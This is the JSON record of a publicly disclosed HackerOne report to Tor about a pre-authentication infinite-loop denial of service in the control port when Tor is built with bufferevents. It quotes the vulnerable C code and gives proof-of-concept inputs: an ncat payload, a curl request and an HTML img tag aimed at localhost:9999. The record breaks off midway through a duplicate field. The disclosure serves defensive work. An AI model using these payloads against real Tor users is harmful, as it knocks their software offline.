{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-10-19T10:15:36.485Z", 
    "voters": [
        "eveeez", 
        "geeknik", 
        "mr_r3boot", 
        "spetr0x", 
        "hthomison1078"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "100.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 113424, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-10-19T09:38:21.219Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "[tor] control connection pre-auth DoS (infinite loop) with --enable-bufferevents", 
    "is_member_of_team?": null, 
    "vote_count": 5, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-11-18T09:38:21.280Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$100", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-01-29T17:36:10.233Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-29T17:36:10.233Z", 
            "actor": {
                "url": "/torproject", 
                "profile": {
                    "name": "Tor"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/800/f60c4e0509668a31fcd9604fc653ef8a43f2e5c4_medium.jpg?1453239375"
                }
            }, 
            "team_handle": "torproject", 
            "bounty_amount": "100.0", 
            "collaborator": {
                "username": "guido", 
                "url": "/guido"
            }, 
            "message": "Hello there,\n\nthanks for the bug report. We consider this issue to not be serious enough to fit in our program. However, the report is nicely written and we appreciate you looking out for more bugs, so here is $100.\n\nFWIW, we consider bufferevents to be a very experimental feature that is not to be enabled in production. We even print a scary warning in the beginning if the person enables it. We should maybe consider being more aggressive in warning people about bufferevents.\n\nAlso, local DoS vulnerabilities are not something we handle as part of this program.\n\nThanks for the report anyway, and keep on bringing good bugs!\n\n", 
            "markdown_message": "<p>Hello there,</p>\n\n<p>thanks for the bug report. We consider this issue to not be serious enough to fit in our program. However, the report is nicely written and we appreciate you looking out for more bugs, so here is $100.</p>\n\n<p>FWIW, we consider bufferevents to be a very experimental feature that is not to be enabled in production. We even print a scary warning in the beginning if the person enables it. We should maybe consider being more aggressive in warning people about bufferevents.</p>\n\n<p>Also, local DoS vulnerabilities are not something we handle as part of this program.</p>\n\n<p>Thanks for the report anyway, and keep on bringing good bugs!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 777132, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-29T17:42:02.966Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-29T17:42:02.966Z", 
            "actor": {
                "username": "asn", 
                "url": "/asn", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "torproject", 
            "message": "Thanks. This has been filed as https://trac.torproject.org/projects/tor/ticket/18189", 
            "markdown_message": "<p>Thanks. This has been filed as <a title=\"https://trac.torproject.org/projects/tor/ticket/18189\" href=\"/redirect?signature=e9992f6b3dbb8c31af1cfcdbf7912441b5e423ae&amp;url=https%3A%2F%2Ftrac.torproject.org%2Fprojects%2Ftor%2Fticket%2F18189\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://trac.torproject.org/projects/tor/ticket/18189</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 777148, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-09T11:24:22.143Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-09T11:24:22.143Z", 
            "actor": {
                "username": "guido", 
                "url": "/guido", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/983/055f2e31c3b25e230eeb37461df974006ba7b0bd_medium.jpg?1403536399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "torproject", 
            "message": "Feel free to mark this one as resolved as well when you are ready :).", 
            "markdown_message": "<p>Feel free to mark this one as resolved as well when you are ready :).</p>\n", 
            "type": "Activities::Comment", 
            "id": 1006331, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "guido", 
                "url": "/guido"
            }, 
            "created_at": "2016-06-09T13:44:47.556Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-09T13:44:47.556Z", 
            "actor": {
                "username": "asn", 
                "url": "/asn", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "torproject", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1006471, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-10-19T09:38:21.247Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-10-19T09:38:21.247Z", 
            "actor": {
                "username": "geko", 
                "url": "/geko", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "torproject", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2083674, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-10-19T10:15:36.537Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-10-19T10:15:36.537Z", 
            "actor": {
                "username": "guido", 
                "url": "/guido", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/983/055f2e31c3b25e230eeb37461df974006ba7b0bd_medium.jpg?1403536399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "torproject", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2083737, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-10-19T10:15:36.593Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-10-19T10:15:36.593Z", 
            "actor": {
                "username": "guido", 
                "url": "/guido", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/983/055f2e31c3b25e230eeb37461df974006ba7b0bd_medium.jpg?1403536399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "torproject", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2083738, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "guido", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/guido", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/983/bc1fffcbbb736a8fa94816a1961b7b76725881eb_small.jpg?1403536399"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 48, 
        "name": "Denial of Service"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -33137576.4718138, 
    "disclosed_at": "2017-10-19T10:15:36.573Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/113424", 
    "created_at": "2016-01-29T05:43:35.625Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>In control.c, this is the loop that retrieves data from the input buffer of the connection, or returns if no complete linefreed-terminated line is available (connection_fetch_from_buf_line() returns 0).</p>\n<pre class=\"highlight c\"><code><span class=\"mi\">4225</span>   <span class=\"nf\">while</span> <span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n<span class=\"mi\">4226</span>     <span class=\"kt\">size_t</span> <span class=\"n\">last_idx</span><span class=\"p\">;</span>\n<span class=\"mi\">4227</span>     <span class=\"kt\">int</span> <span class=\"n\">r</span><span class=\"p\">;</span>\n<span class=\"mi\">4228</span>     <span class=\"cm\">/* First, fetch a line. */</span>\n<span class=\"mi\">4229</span>     <span class=\"k\">do</span> <span class=\"p\">{</span>\n<span class=\"mi\">4230</span>       <span class=\"n\">data_len</span> <span class=\"o\">=</span> <span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd_len</span> <span class=\"o\">-</span> <span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd_cur_len</span><span class=\"p\">;</span>\n<span class=\"mi\">4231</span>       <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">connection_fetch_from_buf_line</span><span class=\"p\">(</span><span class=\"n\">TO_CONN</span><span class=\"p\">(</span><span class=\"n\">conn</span><span class=\"p\">),</span>\n<span class=\"mi\">4232</span>                               <span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd</span><span class=\"o\">+</span><span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd_cur_len</span><span class=\"p\">,</span>\n<span class=\"mi\">4233</span>                               <span class=\"o\">&amp;</span><span class=\"n\">data_len</span><span class=\"p\">);</span>\n<span class=\"mi\">4234</span>       <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">r</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span>\n<span class=\"mi\">4235</span>         <span class=\"cm\">/* Line not all here yet. Wait. */</span>\n<span class=\"mi\">4236</span>         <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"mi\">4237</span>       <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">r</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n<span class=\"mi\">4238</span>         <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">data_len</span> <span class=\"o\">+</span> <span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd_cur_len</span> <span class=\"o\">&gt;</span> <span class=\"n\">MAX_COMMAND_LINE_LENGTH</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n<span class=\"mi\">4239</span>           <span class=\"n\">connection_write_str_to_buf</span><span class=\"p\">(</span><span class=\"s\">&quot;500 Line too long.</span><span class=\"se\">\\r\\n</span><span class=\"s\">&quot;</span><span class=\"p\">,</span> <span class=\"n\">conn</span><span class=\"p\">);</span>\n<span class=\"mi\">4240</span>           <span class=\"n\">connection_stop_reading</span><span class=\"p\">(</span><span class=\"n\">TO_CONN</span><span class=\"p\">(</span><span class=\"n\">conn</span><span class=\"p\">));</span>\n<span class=\"mi\">4241</span>           <span class=\"n\">connection_mark_and_flush</span><span class=\"p\">(</span><span class=\"n\">TO_CONN</span><span class=\"p\">(</span><span class=\"n\">conn</span><span class=\"p\">));</span>\n<span class=\"mi\">4242</span>         <span class=\"p\">}</span>\n<span class=\"mi\">4243</span>         <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd_len</span> <span class=\"o\">&lt;</span> <span class=\"n\">data_len</span><span class=\"o\">+</span><span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd_cur_len</span><span class=\"p\">)</span>\n<span class=\"mi\">4244</span>           <span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd_len</span> <span class=\"o\">*=</span> <span class=\"mi\">2</span><span class=\"p\">;</span>\n<span class=\"mi\">4245</span>         <span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd</span> <span class=\"o\">=</span> <span class=\"n\">tor_realloc</span><span class=\"p\">(</span><span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd</span><span class=\"p\">,</span>\n<span class=\"mi\">4246</span>                                          <span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">incoming_cmd_len</span><span class=\"p\">);</span>\n<span class=\"mi\">4247</span>       <span class=\"p\">}</span>\n<span class=\"mi\">4248</span>     <span class=\"p\">}</span> <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">r</span> <span class=\"o\">!=</span> <span class=\"mi\">1</span><span class=\"p\">);</span>\n</code></pre>\n<p>If connection_fetch_from_buf_line() returns -1, this means that the buffer (conn-&gt;incoming_cmd) is not large enough. conn-&gt;incoming_cmd_len is then increased to a size sufficiently large to hold the incoming command (lines 4243 - 4246). In order for this to work, data_len must be set to this required size by connection_fetch_from_buf_line().</p>\n\n<p>If libevent bufferevents are not enabled, then connection_fetch_from_buf_line() is simply a proxy function for fetch_from_buf_line():</p>\n<pre class=\"highlight c\"><code><span class=\"mi\">3785</span>   <span class=\"p\">})</span> <span class=\"n\">ELSE_IF_NO_BUFFEREVENT</span> <span class=\"p\">{</span>\n<span class=\"mi\">3786</span>     <span class=\"k\">return</span> <span class=\"n\">fetch_from_buf_line</span><span class=\"p\">(</span><span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">inbuf</span><span class=\"p\">,</span> <span class=\"n\">data</span><span class=\"p\">,</span> <span class=\"n\">data_len</span><span class=\"p\">);</span>\n<span class=\"mi\">3787</span>   <span class=\"p\">}</span> \n</code></pre>\n<p>This function will indeed set *data_len to the required size if the present buffer size is too small (line 2255):</p>\n<pre class=\"highlight c\"><code><span class=\"mi\">2241</span> <span class=\"kt\">int</span>\n<span class=\"mi\">2242</span> <span class=\"n\">fetch_from_buf_line</span><span class=\"p\">(</span><span class=\"n\">buf_t</span> <span class=\"o\">*</span><span class=\"n\">buf</span><span class=\"p\">,</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">data_out</span><span class=\"p\">,</span> <span class=\"kt\">size_t</span> <span class=\"o\">*</span><span class=\"n\">data_len</span><span class=\"p\">)</span>\n<span class=\"mi\">2243</span> <span class=\"p\">{</span>\n<span class=\"mi\">2244</span>   <span class=\"kt\">size_t</span> <span class=\"n\">sz</span><span class=\"p\">;</span>\n<span class=\"mi\">2245</span>   <span class=\"kt\">off_t</span> <span class=\"n\">offset</span><span class=\"p\">;</span>\n<span class=\"mi\">2246</span> \n<span class=\"mi\">2247</span>   <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">buf</span><span class=\"o\">-&gt;</span><span class=\"n\">head</span><span class=\"p\">)</span>\n<span class=\"mi\">2248</span>     <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"mi\">2249</span>     \n<span class=\"mi\">2250</span>   <span class=\"n\">offset</span> <span class=\"o\">=</span> <span class=\"n\">buf_find_offset_of_char</span><span class=\"p\">(</span><span class=\"n\">buf</span><span class=\"p\">,</span> <span class=\"sc\">&#39;\\n&#39;</span><span class=\"p\">);</span>\n<span class=\"mi\">2251</span>   <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">offset</span> <span class=\"o\">&lt;</span> <span class=\"mi\">0</span><span class=\"p\">)</span>\n<span class=\"mi\">2252</span>     <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"mi\">2253</span>   <span class=\"n\">sz</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"kt\">size_t</span><span class=\"p\">)</span> <span class=\"n\">offset</span><span class=\"p\">;</span>\n<span class=\"mi\">2254</span>   <span class=\"nf\">if</span> <span class=\"p\">(</span><span class=\"n\">sz</span><span class=\"o\">+</span><span class=\"mi\">2</span> <span class=\"o\">&gt;</span> <span class=\"o\">*</span><span class=\"n\">data_len</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n<span class=\"mi\">2255</span>     <span class=\"o\">*</span><span class=\"n\">data_len</span> <span class=\"o\">=</span> <span class=\"n\">sz</span> <span class=\"o\">+</span> <span class=\"mi\">2</span><span class=\"p\">;</span>\n<span class=\"mi\">2256</span>     <span class=\"k\">return</span> <span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n<span class=\"mi\">2257</span>   <span class=\"p\">}</span> \n<span class=\"mi\">2258</span>   <span class=\"n\">fetch_from_buf</span><span class=\"p\">(</span><span class=\"n\">data_out</span><span class=\"p\">,</span> <span class=\"n\">sz</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"n\">buf</span><span class=\"p\">);</span>   \n<span class=\"mi\">2259</span>   <span class=\"n\">data_out</span><span class=\"p\">[</span><span class=\"n\">sz</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"sc\">&#39;\\0&#39;</span><span class=\"p\">;</span>\n<span class=\"mi\">2260</span>   <span class=\"o\">*</span><span class=\"n\">data_len</span> <span class=\"o\">=</span> <span class=\"n\">sz</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">;</span> \n<span class=\"mi\">2261</span>   <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n<span class=\"mi\">2262</span> <span class=\"p\">}</span>   \n</code></pre>\n<p>However, if libevent bufferevents are enabled (by ./configuring tor with --enable-bufferevents), then the code on lines (3770 - 3784) is executed instead:</p>\n<pre class=\"highlight c\"><code><span class=\"mi\">3765</span> <span class=\"kt\">int</span> \n<span class=\"mi\">3766</span> <span class=\"n\">connection_fetch_from_buf_line</span><span class=\"p\">(</span><span class=\"n\">connection_t</span> <span class=\"o\">*</span><span class=\"n\">conn</span><span class=\"p\">,</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">data</span><span class=\"p\">,</span>\n<span class=\"mi\">3767</span>                                <span class=\"kt\">size_t</span> <span class=\"o\">*</span><span class=\"n\">data_len</span><span class=\"p\">)</span>\n<span class=\"mi\">3768</span> <span class=\"p\">{</span>   \n<span class=\"mi\">3769</span>   <span class=\"n\">IF_HAS_BUFFEREVENT</span><span class=\"p\">(</span><span class=\"n\">conn</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n<span class=\"mi\">3770</span>     <span class=\"kt\">int</span> <span class=\"n\">r</span><span class=\"p\">;</span>\n<span class=\"mi\">3771</span>     <span class=\"kt\">size_t</span> <span class=\"n\">eol_len</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"mi\">3772</span>     <span class=\"k\">struct</span> <span class=\"n\">evbuffer</span> <span class=\"o\">*</span><span class=\"n\">input</span> <span class=\"o\">=</span> <span class=\"n\">bufferevent_get_input</span><span class=\"p\">(</span><span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">bufev</span><span class=\"p\">);</span>\n<span class=\"mi\">3773</span>     <span class=\"k\">struct</span> <span class=\"n\">evbuffer_ptr</span> <span class=\"n\">ptr</span> <span class=\"o\">=</span>\n<span class=\"mi\">3774</span>       <span class=\"n\">evbuffer_search_eol</span><span class=\"p\">(</span><span class=\"n\">input</span><span class=\"p\">,</span> <span class=\"nb\">NULL</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">eol_len</span><span class=\"p\">,</span> <span class=\"n\">EVBUFFER_EOL_LF</span><span class=\"p\">);</span>\n<span class=\"mi\">3775</span>     <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ptr</span><span class=\"p\">.</span><span class=\"n\">pos</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n<span class=\"mi\">3776</span>       <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"cm\">/* No EOL found. */</span>\n<span class=\"mi\">3777</span>     <span class=\"nf\">if</span> <span class=\"p\">((</span><span class=\"kt\">size_t</span><span class=\"p\">)</span><span class=\"n\">ptr</span><span class=\"p\">.</span><span class=\"n\">pos</span><span class=\"o\">+</span><span class=\"n\">eol_len</span> <span class=\"o\">&gt;=</span> <span class=\"o\">*</span><span class=\"n\">data_len</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n<span class=\"mi\">3778</span>       <span class=\"k\">return</span> <span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span> <span class=\"cm\">/* Too long */</span>\n<span class=\"mi\">3779</span>     <span class=\"p\">}</span>     \n<span class=\"mi\">3780</span>     <span class=\"o\">*</span><span class=\"n\">data_len</span> <span class=\"o\">=</span> <span class=\"n\">ptr</span><span class=\"p\">.</span><span class=\"n\">pos</span><span class=\"o\">+</span><span class=\"n\">eol_len</span><span class=\"p\">;</span>\n<span class=\"mi\">3781</span>     <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">evbuffer_remove</span><span class=\"p\">(</span><span class=\"n\">input</span><span class=\"p\">,</span> <span class=\"n\">data</span><span class=\"p\">,</span> <span class=\"n\">ptr</span><span class=\"p\">.</span><span class=\"n\">pos</span><span class=\"o\">+</span><span class=\"n\">eol_len</span><span class=\"p\">);</span>\n<span class=\"mi\">3782</span>     <span class=\"n\">tor_assert</span><span class=\"p\">(</span><span class=\"n\">r</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"p\">);</span>\n<span class=\"mi\">3783</span>     <span class=\"n\">data</span><span class=\"p\">[</span><span class=\"n\">ptr</span><span class=\"p\">.</span><span class=\"n\">pos</span><span class=\"o\">+</span><span class=\"n\">eol_len</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"sc\">&#39;\\0&#39;</span><span class=\"p\">;</span>\n<span class=\"mi\">3784</span>     <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n<span class=\"mi\">3785</span>   <span class=\"p\">})</span> <span class=\"n\">ELSE_IF_NO_BUFFEREVENT</span> <span class=\"p\">{</span>            \n<span class=\"mi\">3786</span>     <span class=\"k\">return</span> <span class=\"n\">fetch_from_buf_line</span><span class=\"p\">(</span><span class=\"n\">conn</span><span class=\"o\">-&gt;</span><span class=\"n\">inbuf</span><span class=\"p\">,</span> <span class=\"n\">data</span><span class=\"p\">,</span> <span class=\"n\">data_len</span><span class=\"p\">);</span>\n<span class=\"mi\">3787</span>   <span class=\"p\">}</span>\n<span class=\"mi\">3788</span> <span class=\"p\">}</span>\n</code></pre>\n<p>Following the size check on line 3777, *data_len is not altered and thus remains the same as before the invocation.</p>\n\n<p>For incoming data larger than the initial buffer size (1024 bytes) and contains a linefeed character past 1024 bytes, this sends the control connection input routine into an infinite loop.</p>\n\n<h1 id=\"proof-of-concept\">Proof of concept</h1>\n\n<p>$ ./configure --enable-bufferevents &amp;&amp; make -j4</p>\n\n<p>Now start tor with this torrc:</p>\n\n<p>ControlPort 9999</p>\n\n<p>then in another terminal:</p>\n\n<p>$ cat genpoc.py <br>\nimport sys<br>\nsys.stdout.write((chr(0x63) * 2000) + chr(0x0A) )</p>\n\n<p>$ python genpoc.py &gt;poc<br>\n$ ncat localhost 9999 &lt;poc</p>\n\n<p>tor now hangs and has to be killed with force (kill -9 &lt;pid&gt;).</p>\n\n<h1 id=\"inter-protocol-exploit\">Inter-protocol exploit</h1>\n\n<p>Since the only two prerequisites of the attack are:</p>\n\n<ul>\n<li>Input longer than 1024 bytes</li>\n<li>Input contains linefeed character after byte 1024</li>\n</ul>\n\n<p>it&#39;s easy to think of other ways of making tor hang than manually creating a connection for this purpose.</p>\n<pre class=\"highlight plaintext\"><code>$ cat genpoc2.py \nprint &quot;curl http://localhost:9999/{}&quot;.format(&quot;x&quot; * 1200)\n$ python genpoc2.py &gt;poc.sh\n$ bash poc.sh\n</code></pre>\n<p>This also causes tor to hang, because curl is sending this to tor:</p>\n<pre class=\"highlight plaintext\"><code>GET /xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: localhost:9999\nAccept: */*\n\n</code></pre>\n<p>which is data that adheres to the prerequisites.</p>\n\n<p>Thus, a person running tor with the control server running locally while also using a regular browser can be DoSed via:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&#39;http://localhost:9999/xxxxxxxxxxxxxxxxxxx...&#39;</span><span class=\"nt\">&gt;</span>\n</code></pre>\n<p>Guido</p>\n", 
    "vulnerability_information": "In control.c, this is the loop that retrieves data from the input buffer of the connection, or returns if no complete linefreed-terminated line is available (connection_fetch_from_buf_line() returns 0).\n\n```c\n4225   while (1) {\n4226     size_t last_idx;\n4227     int r;\n4228     /* First, fetch a line. */\n4229     do {\n4230       data_len = conn->incoming_cmd_len - conn->incoming_cmd_cur_len;\n4231       r = connection_fetch_from_buf_line(TO_CONN(conn),\n4232                               conn->incoming_cmd+conn->incoming_cmd_cur_len,\n4233                               &data_len);\n4234       if (r == 0)\n4235         /* Line not all here yet. Wait. */\n4236         return 0;\n4237       else if (r == -1) {\n4238         if (data_len + conn->incoming_cmd_cur_len > MAX_COMMAND_LINE_LENGTH) {\n4239           connection_write_str_to_buf(\"500 Line too long.\\r\\n\", conn);\n4240           connection_stop_reading(TO_CONN(conn));\n4241           connection_mark_and_flush(TO_CONN(conn));\n4242         }\n4243         while (conn->incoming_cmd_len < data_len+conn->incoming_cmd_cur_len)\n4244           conn->incoming_cmd_len *= 2;\n4245         conn->incoming_cmd = tor_realloc(conn->incoming_cmd,\n4246                                          conn->incoming_cmd_len);\n4247       }\n4248     } while (r != 1);\n```\n\nIf connection_fetch_from_buf_line() returns -1, this means that the buffer (conn->incoming_cmd) is not large enough. conn->incoming_cmd_len is then increased to a size sufficiently large to hold the incoming command (lines 4243 - 4246). In order for this to work, data_len must be set to this required size by connection_fetch_from_buf_line().\n\nIf libevent bufferevents are not enabled, then connection_fetch_from_buf_line() is simply a proxy function for fetch_from_buf_line():\n\n```c\n3785   }) 